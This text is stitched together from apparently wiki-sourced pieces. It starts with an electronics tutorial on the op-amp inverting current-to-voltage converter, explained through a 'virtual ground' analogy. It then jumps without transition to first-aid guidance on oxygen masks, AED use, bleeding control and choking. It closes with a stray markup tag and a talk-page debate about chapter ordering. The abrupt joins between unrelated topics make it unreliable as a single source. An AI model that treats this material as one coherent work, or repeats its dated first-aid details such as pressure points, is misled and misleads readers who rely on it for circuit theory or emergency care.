You can explore the operation of the passive circuit in a more attractive way, if you click ''Exploring'' button in the interactive flash [http://www.circuit-fantasia.com/collections/circuit-collection/circuits/old-circuits/i-to-v-old.html movie] &lt;ref&gt;[http://www.circuit-fantasia.com/collections/circuit-collection/circuits/old-circuits/i-to-v-old.html Passive current-to-voltage converter] is an animated ''Flash'' tutorial revealing the philosophy of the passive version.&lt;/ref&gt; or if you go to ''Stage 2'' in the interactive flash [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html builder].&lt;ref&gt;[http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html Op-amp circuit builder] ([http://www.circuit-fantasia.com/my_work/conferences/et_2003/builder/builder.pdf movie philosophy]) is an interactive ''Flash'' tutorial that shows how to transform any passive converter into an active one.&lt;/ref&gt;

== Basic non-electrical idea: ''Removing a disturbance by an &quot;antidisturbance&quot;'' ==

Remember what we do in real life when we solve some problem but a disturbance '''caused by ourselves''' stands in our way. The classical remedy is to ''remove the cause of the disturbance''. Only, it is not always possible to do that; then, we use another exotic solution - we ''remove the disturbance by an equivalent &quot;antidisturbance&quot;''. For this purpose, we use an additional power source (energy), which &quot;helps&quot; us (the main source) by compensating only the local losses caused by the '''internal''' troublesome quantity (conversely, in the opposite [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter#Basic electrical idea: Removing voltage by an &quot;antivoltage&quot;|active voltage-to-current converter]], the additional power source compensates the losses caused by the '''external''' quantity). This technique is associated with continuous wasting of additional energy but the result is zero ([http://circuit-fantasia.com/circuit_stories/inventing_circuits/virtual_ground/virtual_ground.htm virtual ground] &lt;ref&gt;[http://circuit-fantasia.com/circuit_stories/inventing_circuits/virtual_ground/virtual_ground.htm How do we create a virtual ground?] reveals the secret of the great circuit phenomenon on which the op-amp inverting voltage-to-current converter is based.&lt;/ref&gt;); so, we prefer to use it when we are rich and, at the same time, lazy enough:). An example: if we have broken our window in winter, we turn on a heater that compensates the thermal losses; and v.v., in summer, we turn on an air-conditioner. More examples: if our car has come into collision with other car, the insurance company compensates the damages that we have caused to the else's car, if we cause troubles to others, we apologize, if we have spent money from our account, we begin depositing additional money into the account, etc. (see [[w:Virtual_ground#Non-electrical_domain: The &quot;neutralizing&quot; idea|virtual ground]] page&lt;ref&gt;[[w:Virtual ground|Virtual ground]] scrutinizes the basic phenomenon behind the circuits with parallel negative feedback.&lt;/ref&gt; for more examples). In all these cases,

''we have prepared (just in case) &quot;standby&quot; resources to use them, if there is a need to compensate eventual internal losses''.

== Basic electrical idea: ''Removing voltage by an &quot;antivoltage&quot;'' ==

=== Building the electric circuit ===

[[Image:Active_i-to-v_converter_1000.jpg|right|thumb|400px|Fig. 3. Active I-to-V converter = passive I-to-V converter + &quot;helping&quot; voltage source (go to Stage 3 in the interactive [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html builder] to explore the circuit).]]

Now, let us put this powerful idea into practice. The voltage drop V&lt;sub&gt;R&lt;/sub&gt; across the resistor R is harmful; so, following the recipe above, we have to remove it by an &quot;antivoltage&quot; -V&lt;sub&gt;R&lt;/sub&gt;. In other words, we have to add so much voltage to the input (excitation) voltage source V&lt;sub&gt;IN&lt;/sub&gt;, as much as it loses across the resistor R

&lt;center&gt;''Active I-to-V converter = passive I-to-V converter + &quot;helping&quot; voltage source''&lt;/center&gt;

The best way to understand what real electronic components do is just to do their work. So, let us first build a &quot;man-controlled&quot; active circuit, in which a man (I might do this donkeywork:) produces the &quot;anti-voltage&quot; while you change the input voltage. For this purpose, I first place an additional supplementary battery B&lt;sub&gt;H&lt;/sub&gt; in series to the resistor R (Fig. 3). Then, in order to compare the two voltages, I connect a zero indicator in point A, which shows the result of comparison V&lt;sub&gt;A&lt;/sub&gt; = V&lt;sub&gt;H&lt;/sub&gt; - V&lt;sub&gt;R&lt;/sub&gt;. See how simple it is:

''Add an adjustable battery in series with the resistor and make its voltage equal to the voltage drop across the resistor!''

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Where to take an output from? ===

Now, we have to decide where to take the output (where to connect the load). Let's consider the possible solutions (see Fig. 4). 

[[Image:Where_to_take_output_1000.jpg|right|thumb|400px|Fig. 4. The best solution is to use the &quot;copy&quot; voltage -V&lt;sub&gt;H&lt;/sub&gt; as an output instead the &quot;original&quot; voltage V&lt;sub&gt;R&lt;/sub&gt;.]]

'''V&lt;sub&gt;OUT1&lt;/sub&gt; = V&lt;sub&gt;A&lt;/sub&gt; = 0.''' It is naturally to try using the old circuit output (the voltage of point A versus the ground). But we have just destroyed this voltage (the point A has become virtual ground)! So, we can't use this voltage as an output:(

'''V&lt;sub&gt;OUT2&lt;/sub&gt; = V&lt;sub&gt;R&lt;/sub&gt;.''' Then let's try using the voltage V&lt;sub&gt;R&lt;/sub&gt; across the resistor R. Only, in order to connect a load to the &quot;floating&quot; resistor R, the load has to have a differential input. Moreover, if the load has some resistance, it will shunt the resistor thus affecting the current. What do we do then?&lt;br&gt;
Recall to mind the cases from our routine when we prefer to estimate indirectly some quantity X. For this purpose, we first destroy the unknown quantity by an equal &quot;anti-quantity&quot; Y = X; then, we measure the &quot;anti-quantity&quot; Y, in order to know the magnitude of the initial quantity X. An example - classic weighing by using balance.

'''V&lt;sub&gt;OUT3&lt;/sub&gt; = -V&lt;sub&gt;H&lt;/sub&gt;.''' Eureka! We will use the &quot;copy&quot; voltage -V&lt;sub&gt;H&lt;/sub&gt; as an output instead the &quot;original&quot; voltage V&lt;sub&gt;R&lt;/sub&gt;! What a great idea! First, the load will be connected to the common ground; second, it will consume energy from the &quot;helping&quot; source B&lt;sub&gt;H&lt;/sub&gt; instead from the input source V&lt;sub&gt;IN&lt;/sub&gt;!

=== Exploring the electric circuit ===

In the beginning, imagine that there is not input excitation voltage V&lt;sub&gt;IN&lt;/sub&gt;. As a result, there are not any voltage drops and currents in the circuit; the needle of the zero indicator points to zero position (Fig. 5). I am happy because there is nothing to do:)

[[Image:Man_trans_ampl_pos_1000.jpg|right|thumb|400px|Fig. 5. A man acting as an op-amp in the circuit of an active current-to-voltage converter (go to Stage 2 in the interactive [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html builder] to explore the circuit).]]

If you increase the input voltage V&lt;sub&gt;IN&lt;/sub&gt;, a current begins flowing through the resistor. As a result, a voltage drop V&lt;sub&gt;R&lt;/sub&gt; appears across the resistor and the point A begins rising its potential V&lt;sub&gt;A&lt;/sub&gt; (figuratively speaking, the input source &quot;pulls&quot; the point A up toward the positive voltage V&lt;sub&gt;IN&lt;/sub&gt;). Only, I observe to my great displeasure that the needle deflects to the right and immediately react by decreasing the compensating voltage V&lt;sub&gt;H&lt;/sub&gt;. Now, it &quot;pulls&quot; the point A down toward the negative voltage -V&lt;sub&gt;H&lt;/sub&gt; until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt; (the [[Wikipedia:Virtual ground|virtual ground]]). Note that the two voltage sources are connected in series, in one and the same direction (- V&lt;sub&gt;IN&lt;/sub&gt; +, - V&lt;sub&gt;H&lt;/sub&gt; +) so that their voltages are added (let's assume that we traverse the loop clockwise). Regarding to the ground, they have opposite polarities.

In this way, the input voltage source is &quot;helped&quot;; its voltage increases so much (V&lt;sub&gt;R&lt;/sub&gt;) as it loses across the resistor. As a result, the &quot;troublesome&quot; voltage V&lt;sub&gt;R&lt;/sub&gt; disappears; the point A has zero voltage; it behaves as a [[Wikipedia:Virtual ground|virtual ground]]. The real input voltage source is &quot;fooled&quot;: it has the illusion that  its output is shorted.

You can imagine what happens when you decrease the input voltage V&lt;sub&gt;IN&lt;/sub&gt; under the ground. As above, I will adjust the battery voltage looking at the needle of the zero indicator, so that always V&lt;sub&gt;H&lt;/sub&gt; = -V&lt;sub&gt;R&lt;/sub&gt;. In electronics, in technical world and in our human world, this action is referred to as [[Wikipedia:Negative feedback|negative feedback]] (great phenomenon).

== Op-amp inverting current-to-voltage converter ==

=== Building the electronic circuit ===

Let us now try to make some electronic device do this donkeywork; an op-amp seems to be a good choice. For this purpose, we connect the op-amp's output in the place of the helping voltage source and the op-amp's input to point A so that the op-amp to &quot;help&quot; the input source (the op-amp's output voltage and the input voltage to be summed).

&lt;center&gt;''Op-amp I-to-V converter = passive I-to-V converter + &quot;helping&quot; op-amp''&lt;/center&gt;

=== Exploring the electronic circuit ===

In the beginning, imagine as [[#Exploring the electric circuit|above]] that there is not an input excitation voltage V&lt;sub&gt;IN&lt;/sub&gt;. As a result, there are not any voltage drops and currents in the circuit. There is almost not a voltage difference between the inverting and non-inverting input of the op-amp; now, it is &quot;happy&quot; because there is nothing to do:)

[[Image:Op-amp_trans_ampl_pos_1000.jpg|right|thumb|400px|Fig. 6. Op-amp I-to-V converter = passive I-to-V converter + &quot;helping&quot; op-amp (driven by a positive input voltage). Go to Stage 4 in the interactive [http://www.circuit-fantasia.com/collections/tools/pnfb-builder.html builder].]]

==== Positive input voltage ====

If the input voltage V&lt;sub&gt;IN&lt;/sub&gt; increases, an input current I&lt;sub&gt;IN&lt;/sub&gt; begins flowing through the resistor R (Fig. 6). As a result, a voltage drop V&lt;sub&gt;R&lt;/sub&gt; appears across the resistor and the point A begins rising its potential V&lt;sub&gt;A&lt;/sub&gt; (the input source &quot;pulls&quot; the point A up toward the positive voltage V&lt;sub&gt;IN&lt;/sub&gt;). Only, the op-amp &quot;observes&quot; that to its great displeasure:( and immediately reacts: it decreases its output voltage &quot;sucking&quot; the current I&lt;sub&gt;IN&lt;/sub&gt; until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt;. Figuratively speaking, the op-amp &quot;pulls&quot; the point A down toward the negative voltage -V to establish a virtual ground. It does this magic by connecting a part of the voltage produced by the negative power supply -V in series with the input voltage V&lt;sub&gt;IN&lt;/sub&gt;. As [[#Exploring the electric circuit|above]], the two voltage sources are connected in series, in one and the same direction (- V&lt;sub&gt;IN&lt;/sub&gt; +, - V&lt;sub&gt;H&lt;/sub&gt; +) so that their voltages are added. Only, regarding to the ground, they have opposite polarities.

&lt;br style=&quot;clear:both;&quot;/&gt;

[[Image:Op-amp_trans_ampl_neg_1000.jpg|right|thumb|400px|Fig. 7. Op-amp I-to-V converter = passive I-to-V converter + &quot;helping&quot; op-amp (driven by a negative input voltage).&lt;/center&gt;]]

==== Negative input voltage ====

If the input voltage V&lt;sub&gt;IN&lt;/sub&gt; decreases under the ground, an input current I&lt;sub&gt;IN&lt;/sub&gt; begins flowing through the resistor R in opposite direction (Fig. 7). As a result, a voltage drop V&lt;sub&gt;R&lt;/sub&gt; appears across the resistor and the point A begins dropping its potential V&lt;sub&gt;A&lt;/sub&gt; (now, the input source &quot;pulls&quot; the point A down toward the negative voltage -V&lt;sub&gt;IN&lt;/sub&gt;). Only, the op-amp &quot;observes&quot;' that and immediately reacts: it increases its output voltage &quot;pushing out&quot; the current I&lt;sub&gt;IN&lt;/sub&gt; until it manages to zero the potential V&lt;sub&gt;A&lt;/sub&gt; (now, the op-amp &quot;pulls&quot; the point A up toward the positive voltage +V, in order to establish a virtual ground). It does this magic by connecting a part of the voltage produced by the positive power supply +V in series with the input voltage V&lt;sub&gt;IN&lt;/sub&gt;. The two voltage sources are connected in series again, in one and the same direction (+ V&lt;sub&gt;IN&lt;/sub&gt; -, + V&lt;sub&gt;H&lt;/sub&gt; -) so that their voltages are added. Regarding to the ground, they have opposite polarities as above.

&lt;br style=&quot;clear:both;&quot;/&gt;

'''Conclusion.''' ''In the circuit of an op-amp current-to-voltage converter, the op-amp adds as much voltage to the voltage of the input source as it loses across the resistor. The op-amp compensates the local losses caused by this '''internal resistor''' (conversely, in the opposite [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter|op-amp inverting voltage-to-current converter]], the op-amp compensates the losses caused by the '''external load''').''

== Applications of the op-amp I-to-V converter ==

Once we created a perfect current-to-voltage converter, we may use it as a building block to build more complex compound circuits. For this purpose, we have only to connect consecutively the separate building blocks.

[[Image:Op-amp_inv_ammeter_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 8. Op-amp inverting ammeter = op-amp current-to-voltage converter + voltmeter&lt;/center&gt;]]

=== Staying before the circuit input ===

First, we may connect the op-amp current-to-voltage converter before circuits having voltage input; thus we make them perceive current.

'''Perfect ammeter.''' We have already built a simple ammeter by connecting a simple current-to-voltage converter (a shunt resistor) before the voltmeter:

''Compound ammeter = current-to-voltage converter + voltmeter''

Similarly, we can build a perfect ammeter by connecting an op-amp current-to-voltage converter before the voltmeter (Fig. 8):

''Perfect ammeter = op-amp current-to-voltage converter + voltmeter''

This active ammeter does not introduces a troublesome voltage drop into the measured circuit. Only, the popular multimeters use exactly the passive version, in order to measure big currents (see [[#Comparison between the passive and active version|comparison between the passive and active version]]).

&lt;br style=&quot;clear:both;&quot;/&gt;

[[Image:V-to-i inv ampl 1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 9. Op-amp inverting amplifier = V-to-I converter + op-amp I-to-V converter&lt;/center&gt;]]

=== Staying after the circuit output ===

Then, we may connect the op-amp current-to-voltage converter after circuits having current output; thus we make them produce voltage. For example, we have known how to build a simple current source. By applying this technique, we may assemble the famous op-amp circuits of inverting amplifier (Fig. 9), capacitive differentiator, inductive integrator, diode antilogarithmic converter, etc.

''Op-amp inverting amplifier = V-to-I converter + op-amp I-to-V converter''

''Op-amp V-to-V CR differentiator = V-to-I C differentiator + op-amp I-to-V converter''

''Op-amp V-to-V LR integrator = V-to-I L integrator + op-amp I-to-V converter''

''Op-amp V-to-V DR antilog converter = V-to-I D antilog converter + op-amp I-to-V converter''

In all these circuits, the voltage drop across the respective I-to-V converters does not introduce an error (precisely speaking, it will introduce an error but the op-amp will remove it). 

&lt;br style=&quot;clear:both;&quot;/&gt;

=== Acting as a transimpedance amplifier ===

The op-amp I-to-V converter like as an [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter#Acting as a transconductance amplifier|op-amp V-to-I converter]] is an active circuit; so, we may expect it to amplify too. Really, it acts as a linear circuit with transfer ratio k = V&lt;sub&gt;OUT&lt;/sub&gt;/I&lt;sub&gt;IN&lt;/sub&gt; [V/mA] or [[Wikipedia:Ohm|ohms]] having dimension of resistance. That is why, they frequently name it transresistance or [[Wikipedia:Transimpedance amplifier|transimpedance amplifier]] (transimpedance is a contraction of &quot;transfer impedance&quot;). Nevertheless, let's try to answer the question, &quot;Is the op-amp I-to-V converter an amplifier?&quot;

Yes, it is an amplifier! The ''op-amp inverting I-to-V converter'' does not consume any power from the input source; it is just a short connection (see the explanations below about the input resistance). So, it is a more perfect amplifier than the opposite [[Circuit Idea/Op-amp Inverting Voltage-to-Current Converter|op-amp inverting voltage-to-current converter]], which consumes power P = V&lt;sub&gt;IN&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt;/R. To compare the two circuits, assemble again an op-amp inverting amplifier by connecting  consecutively a bare resistor (R&lt;sub&gt;1&lt;/sub&gt;) and a current-to-voltage converter (the resistor R&lt;sub&gt;2&lt;/sub&gt; and an op-amp OA) - Fig. 9.

== Comparison between the passive and active version ==

[[Image:Active_i-to-v_in_res_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 10. The input resistance is zero.&lt;/center&gt;]]

Let us finally compare the two versions beginning by investigating the input and output resistances. 

'''Input resistance.''' First, connect an ammeter ''in series with'' and a voltmeter ''in parallel to'' the converter's input (Fig. 10); then vary the input voltage to investigate the input resistance. Maybe you remember that in the passive version, looking from the side of the input source we were seeing two resistors connected in parallel - R and R&lt;sub&gt;L&lt;/sub&gt;; so, the input resistance was R&lt;sub&gt;IN&lt;/sub&gt; = R||R&lt;sub&gt;L&lt;/sub&gt;. Now, we see zero resistance because the op-amp has &quot;neutralized&quot; the resistance R.

It is wonderful, the resistor R has disappeared! In this case, the op-amp &quot;helps&quot; the input voltage in its striving to change the current.

[[Image:Active_i-to-v_out_res_1000.jpg|right|thumb|350px|&lt;center&gt;Fig. 11. The output resistance is zero too.&lt;/center&gt;]]

'''Output resistance.'''  Now, connect a voltmeter ''in parallel to'' and an ammeter ''in series with'' the converter's output (Fig. 11); then, vary the load resistance (voltage) and observe the current to investigate the output resistance. Remember that in the passive version, looking from the side of the load, we were seeing two resistors connected in parallel - Re (the equivalent resistance of the input circuit) and R; so, the output resistance was R&lt;sub&gt;OUT&lt;/sub&gt; = Re||R. Now, the situation is quite more interesting: when we vary the load the output voltage stays steady! The circuit behaves as a perfect voltage source with zero output resistance.

'''Operating range.''' The op-amp does all these &quot;magics&quot; until it can change its output voltage (i.e., until it is within the active region). When it reaches the supply rail, the op-amp saturates, the magic ceases and the almost ideal active circuit becomes again an imperfect passive one:(. Note that the passive version does not have such a problem; it is always imperfect:)

'''Power considerations.''' Although the active current-to-voltage converter is a perfect circuit, the popular multimeters do not work that way. In order to measure a current, they use the imperfect passive current-to-voltage converter instead of the almost ideal op-amp current-to-voltage converter. The reason for applying such an old-fashioned approach to current measurements is that all the input current I&lt;sub&gt;IN&lt;/sub&gt; flows through the &quot;helping&quot; voltage source B&lt;sub&gt;H&lt;/sub&gt; in the active version (Fig. 3). Therefore, the source has to be able to endure such a current. Accordingly, in the practical op-amp circuit (Fig. 4), both the power source and the op-amp have to endure the input current measured. For example, if they try to measure a current of 10A (a normal maximum current range in all purpose DVMs), they have to use a car battery as a power supply and a power &quot;op-amp&quot;, which is able to dissipate 100W!

''The active (op-amp) current-to-voltage converter is a perfect circuit; however, it is suitable only for low-current applications.''

'''Polarities.''' Another difference between the two versions is that the op-amp circuit is inverting (maybe, in some cases this is an advantage).

The op-amp inverting current-to-voltage converter is one of the most popular converting circuits, which exists in almost every electronics book on op-amp circuits. Only, the basic idea behind the famous circuit is and continues remaining undisclosed.

{{FA Advanced Topics}}

==Oxygen Administration==
[[Image:O2kit.jpg|thumb|Oxygen kit showing a demand valve and a constant flow mask.]]

===Nasal Cannula===
The '''nasal cannula''' is a thin tube with two small nozzles that protrude into the victim's nostrils. It can only provide oxygen at low flow rates: 2-6 liters per minute, delivering a concentration of 28-44%. Use of the nasal cannula at higher flow rates than 6 liters per minute can cause discomfort by drying the nasal passages and pain from the force of the oxygen.

===Bag-Valve-Mask===
:''See also: [[First Aid/Airway Management#Bag-Valve-Mask|Bag-Valve-Mask]]''

The task of administrating oxygen with bag-valve-mask (BVM) is not very demanding, and requires only one hand to squeeze the bag and one to maintain a good seal with the mask. Thus, this task can advantageously be achieved by one rescuer, who will then keep their mind free and, being at the head of the victim, have a good view of the overall situation. The head of the victim can be secured between the knees of the BVM operator.
The bag-valve-mask (BVM) is used for victims in critical condition who require pure oxygen. A reservoir bag is attached to a central cylindrical bag, attached to a valved mask that administers 100% concentration oxygen at 8-15LPM. The central bag is squeezed manually to ventilate the victim.

===Non-rebreathing Mask===
{{FA Caution|Do not allow grease or oils to come in contact with or be near oxygen tanks at ANY time. This can cause explosive combustion!}}
The '''non-rebreathing mask''' (NRB) is utilized for patients with multiple trauma injuries, chronic airway limitation/chronic obstructive pulmonary diseases, smoke inhalation, and carbon monoxide poisoning, or any other patient that requires high-flow oxygen, but does not require breathing assistance. It has an attached reservoir bag where oxygen fills in between breaths, and a valve that largely prevents the inhalation of room or exhaled air. This allows the administration of high concentrations of oxygen, between 65-85%. This device is set to 10-15 lpm, or at least enough to keep the reservoir inflated between breaths. Due to the poor seal on a patient's face, it is exceedingly difficult to obtain anything approaching 100% oxygen with this device. While some patients with Chronic Obstructive Pulmonary Disease (COPD) rely on what is called hypoxic drive, high flow oxygen should never be withheld from COPD patients who require it.
{{-}}

===Pocket Mask===
The '''pocket mask''' is a small device that can be carried on one's person. It is used for the same victims that the BVM is indicated for, but instead of delivering breaths by squeezing a reservoir, the first aider must actually exhale into the mask. Pocket masks normally have one-way valves built into them to protect against cross-contamination. Many masks also have an oxygen intake built-in, allowing for administration of 50-60% oxygen.

Defibrillation
Defibrillation is an essential part of resuscitation. Survival chances of a fibrillating victim (ventricular fibrillation or ventricular tachycardia) start at 90% if defibrillated immediately and decrease by 10% every minute. Should a victim be in cardiac arrest and require defibrillation, it is crucial that EMS is called '''immediately'''.

Defribrillation operations start by exposing the chest, and removing all metallic items American red Cross says:
&quot;■ Jewelry and body piercings: You do not need to remove jewelry and 
body piercings when using an AED. Leaving them on the victim does no 
harm. However, do not place the AED pads directly over metallic jewelry 
or body piercings. Adjust AED pad placement if necessary&quot;
Prior to the application of the defibrillation pads, shaving the chest of exceptionally hairy victims is advised to increase conductivity to the chest and reduce the chance of burns, though shaving the chest should only be performed if a razor is readily available and will not delay defibrillation by more than 20 seconds. It is also crucial that you remove any patches (especially medicine and nicotine) on the person's chest '''while wearing gloves''' to ensure the shock will not be interrupted by having to go through these patches. Failure to remove nicotine patches can result in a fire. 

{{FA X Left|'''Do not shock if''':&lt;br&gt;&lt;ul&gt;&lt;li&gt;The victim is close to explosive or flammable material.&lt;li&gt;The victim is wet (dry the victim off with a towel).&lt;li&gt;The victim has a medicine patch on them, however, you must remove this ''while wearing gloves.''&lt;li&gt; The victim is touching an object that could conduct the charge to others. (A metal bench)&lt;/ul&gt;&lt;br&gt;If necessary, protect the victim from water and dry them, or move the victim a few meters between each CPR cycle until the area is safe for defibrillation.&lt;br&gt;&lt;br&gt;Cell phones and other electronic devices can disrupt the analyzing phase of the AED. Check for a cell phone on the patient and remove it to a distance of 6 feet or more. This will include your cell phone and any bystander who is carrying one. (If time is crucial, throw the cell phone as far as possible, don't take precious seconds to walk it somewhere. Remember, life over limb (or possessions, in this case.)}}


Now turn on the defibrillator unless it automatically turns on once you open it. Most AED units will give clear voice instructions; follow the prompts. Once the chest is exposed, you are to place the electrodes: one on the left side, under the arm, and the other over the right breast. The location of pad placement is clearly depicted on each pad; they must go exactly as shown in the picture. Once connected, the defibrillator will automatically start monitoring the heart's electrical activity to determine whether a shock is appropriate.  Some defibrillators require the user to press an analyze button before the machine will analyze the heart rhythm.  The machine will clearly talk you through all steps of the process.

'''CPR must be stopped''' while the defibrillator is monitoring the victim's heart activity. In all cases, defibrillation has priority over CPR. Do not touch the victim or the AED - if you do, you could interfere with the analysis.

If the AED advises a shock, the operator will say &quot;I'm Clear, you're clear, we're all clear&quot; while ensuring that the operator is not touching the victim or standing in a wet environment next to the victim that could conduct electricity through the rescuer.  The AED operator is also making sure that all other people surrounding the victim are clear.  The final &quot;we are all clear&quot; ensures a double check to ensure that everyone is away from the victim. If the victim is being given oxygen supplementation, the equipment must be removed at this point. The AED will shock the victim; the operator may be required to press a ''shock'' button. '''Touching the victim is potentially fatal''' when the shock is administrated. After the shock has been delivered, it is safe to touch the victim; no electricity will remain in them.  The defibrillator will advise you what to do next - usually you'll be told to begin chest compressions and rescue breaths again.

[[Image:Automated External Defibrillator Amsterdam airport.jpg|thumb|AEDs are being deployed in public places including the Amsterdam airport.]]

Defibrillators can also be used for monitoring and recording purposes; a different set of electrodes is available on some defibrillators for cardiac monitoring, though most defibrillators have the cardiac monitoring located within the pads.  Because cardiac monitoring (ECG) is an advanced skill, it will not be covered in this section. Should fibrillation occur when the monitoring patches are on, the defibrillator will ask the operator to change patches, though most automatically analyze the patient through the two main patches every 2 minutes or whenever the analyze button is pressed.

Note: Defibrillators are often quite graphically pictured in films and television shows. Actually, defibrillation might induce some contractions in the muscles of the patient, but in no case will the patient jump. In most television shows, the paddles are used which may make a rescuer feel apprehensive about defibrillating a patient if they believe that they have to gel the paddles then rub them together before shocking the patient. All AEDs used in the public access setting have two pre-gelled patches that are easily placed onto the patient's skin.  This keeps the rescuer at a further distance from the patient during the shocking and enables the patches to stay on continuously during the resuscitation efforts.

==Deadly Bleeding==
{{FA Best Practice|If the gauze or dressing becomes saturated, DO NOT take the gauze away. Apply more gauze as necessary, only professional medical personnel should remove dressings. This includes anything the victim may have applied. Add, never take away.}}
CPR without enough blood is useless, so a check for deadly bleeding should be included in your primary survey whenever possible.

'''If your victim is breathing''', then you should continue your primary assessment with a check for deadly bleeding.

'''If your victim isn't breathing''', then you'll be doing CPR; a bystander or second trained first aider may be able to perform this check while you continue resuscitation.

===Assessment===
With '''gloved hands''' check the victim's entire body for bleeding, starting with the head. Stick your hands behind or underneath the victim and remove them, repeating this process every couple of inches until you have reached the victim's heels. If your hands are bloody when you withdraw them, then you've found bleeding. An injury on the head or neck, may indicate a spinal injury, in which case you should keep the victim's head and neck stationary. Be thorough. Blood will seek the lowest level, and a blood soaked sock could be from a knee laceration. Also, hair conceals blood surprisingly well — make sure you check the scalp thoroughly. 
{{FA Caution|Remember that about 80% of life-threatening bleeding can be controlled adequately using direct pressure alone and the application of a tourniquet may result in the loss of the limb.}}

===Treatment===
The key element in treating severe bleeding is the application of firm, direct pressure to the wound, using sterile gauze or other dressing. If the wound is in a limb, raising it above the heart can help, though this should not be done if there is a risk of disturbing fractures, or if it causes much pain to the victim.

You may also consider using pressure points to control major bleeding: press down on an artery that is between the heart and the wound to slow blood from flowing to the wound. Two easily found ones are on the underside of the bicep area, and the underside of the thigh area of the leg. 

Tourniquets may also be useful in controlling massive bleeding such as an amputation. This is not a standard procedure and should '''only be used as an ABSOLUTE last resort when the victim will die without it'''. Also, once a tourniquet is applied, it is only removed by a physician.

==Conscious Victims==
A person may be choking if they:
* '''desperately grab at their neck'''
* cannot speak or cry out
* face turns blue from lack of oxygen

The initial action if you suspect choking is to clearly ask the victim &quot;Are you choking?&quot; 

If the victim can reply verbally, you should not undertake any physical contact, but do encourage the victim to cough.

===Treatment for adults and children===
* Encourage the victim to cough - some victims are in so much panic they require encouragement to cough
* Deliver up to 5 hard blows with the heel of your hand to the centre of the victims back between the shoulder blades.
* If the object has still not been removed, and the victim is still choking, you should perform up to five abdominal thrusts.
**The rescuer stands behind and to the side of the victim and wraps their arms around the victim's sides, underneath the victim's arms
**One hand is made into a fist and placed, thumb side in, flat against the victim's upper abdomen, below the ribs but above the navel
**The other hand grabs the fist and directs it in a series of upward thrusts until the object obstructing the airway is expelled
**The thrusts should not compress or restrict the ribcage in any way.
**If you're not able to compress the victim's diaphragm due to their size or pregnancy, then perform the thrusts at the chest.
*Continue a cycle of back blows and abdominal thrusts until the blockage is removed, or the victim becomes unconscious (see below for action when unconscious) 

[[Image:Abdominal thrusts3.jpg|thumb|Abdominal thrusts are performed only on conscious adult or child victims with a severe airway obstruction]]
Note that even when performed correctly, abdominal thrusts can injure the person they are performed on, and so should always be used as a last resort after encouragement to cough and back blows. Abdominal thrusts should never be performed on someone who can still cough, breathe, or speak - encourage them to cough instead.

'''If the victim loses consciousness, call for an ambulance.''' '''''They fall - you call'''''

===Obstructed Airway for Infants===
For infants, a severe obstruction may be accompanied by a high-pitched, crow-like sound which is not present in adults or children. This is due to the incomplete formation of the infant's airway. ''Instead of abdominal thrusts'', alternate 5 chest thrusts with 5 back blows:
*Hold the infant with the head in your hand, and the spine along your forearm and the head below the rest of the body
*Compress the chest 5 times as you would for infant CPR
*Switch the infant to your other forearm, so their chest is now against the arm
*Perform 5 back blows, keeping the infant's head below the rest of the body
*Continue until the obstruction is cleared, or the infant goes unconscious

==Unconscious Victims==
Send a bystander to activate the Emergency Medical System if possible.
*Rescuers alone with an adult victim should call an ambulance immediately.
*Rescuers alone with a child or infant victim should call an ambulance after about 2 minutes.

Commence a primary assessment, starting with [[First Aid#A for Airway|Airway]].

It is highly likely that the patient will not be breathing if they are unconscious as a result of airway obstruction, so you should be prepared to commence CPR if this is the case.  You should continue to attempt to put breaths in to the patient, even if they appear to not be reaching the lungs.

      <text xml:space="preserve">== BLS Chapter ==


In my opinion, D for Deadly bleeding has no real place here in a chapter fundamentally about resucitation.  It would be far better to cover D for Defribrillation here - even if it's only about how to work with someone operating a defibrillator and a seperate chapter later for how to actually use (although i'd prefer to cover it all here).  

Leave bleeding in it's own place.  In reality nobody is likely to come to the section on resus to find a section on bleeding.  Let's move it.


I've also moved AVPU here (as part of the larger mnemonic) as its very imporatnt to knwo how to check response before commencing ABC checks.

[[User:Owain.davies|Owain.davies]] 14:31, 3 July 2007 (UTC)

:The point is that Deadly bleeding ''is'' an ABC emergency. If you're a lone rescuer it might not make a difference since you'll be busy doing CPR, but a wet check should definitely be done as a precursor to the head-to-toe of a secondary survey if you have access to a bystander or another trained rescuer. As for ''treatment'' of deadly bleeding, I'm fine to move it over to [[First Aid/External Bleeding]]. Getting an AED (and AED-trained responder)? That's part of calling EMS. When you do one, you do the other. That's why I proposed the above changes. '''&amp;ndash; [[User:Mike.lifeguard|Mike.lifeguard]]''' | &lt;sup&gt;[[User talk:Mike.lifeguard|talk]]&lt;/sup&gt; 13:57, 5 July 2007 (UTC)

Here i think that Defibrillation is definately the priority over bleeding, so probably deserves the space more.  Especially as AED now forms part of many standard first aid courses.

:It ''does'' get priority over bleeding - that's why getting an AED comes ''before'' '''D'''eadly bleeding. '''C'''ompressions also take priority over '''D'''eadly bleeding. Perhaps that should be made more clear, but that's what's intended there. If you want ''operation of the AED'' to take the priority over CPR (as is proper), then that should be included in [[First Aid/Automated External Defibrillation]] and reinforced in [[First Aid/C for Compressions]].
:Getting an AED is already included in '''A'''mbulance (which still needs to be created). ''Getting an AED'' is part of that step. ''Operation'' of AEDs is ''not'' part of Standard first aid, but is included as an advanced topic [[First Aid/Automated External Defibrillation|here]]. As for putting &quot;get an AED&quot; into D for Defib... that's not where it should happen in the sequence of things - it's at the same time as activating EMS. 
:'''A'''rea (hazards, MOI, barriers...)
:'''A'''wake (LOC)
:'''A'''mbulance (get EMS and an AED)
:'''A'''irway
:'''B'''reathing
:'''C'''ompressions (getting an AED comes earlier; deadly bleeding comes later; using the AED takes priority over BLS)
:'''D'''eadly bleeding (AED has already been summoned. Putting it here is out-of-order. ''Operation'' of an AED is covered elsewhere, and is not part of BLS.

